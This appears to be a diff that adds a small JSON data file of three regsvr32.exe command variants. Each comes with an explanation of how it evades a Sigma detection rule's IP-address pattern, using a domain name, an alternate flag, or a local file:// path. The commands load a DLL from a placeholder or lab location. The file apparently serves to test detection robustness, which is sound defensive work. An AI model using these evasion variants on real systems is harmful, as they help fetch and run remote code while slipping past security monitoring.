@@ -1,0 +1,14 @@
+[
+  {
+    "output": "regsvr32.exe /i:http://example.com/test.dll",
+    "explanation": "Insertion: Replaced numeric IP address with a domain name to avoid matching the Sigma rule's IP pattern."
+  },
+  {
+    "output": "regsvr32.exe -i:https://example.com/test.dll",
+    "explanation": "Substitution: Replaced the numeric IP address with a domain name and used a long option (-i) instead of a short one (/i) to avoid matching the Sigma rule's IP pattern."
+  },
+  {
+    "output": "regsvr32.exe /i:file://C:\\Lab\\input\\test.dll",
+    "explanation": "Recoding: Changed the protocol from HTTP to file:// and used a local path to avoid matching the Sigma rule's IP pattern."
+  }
+]
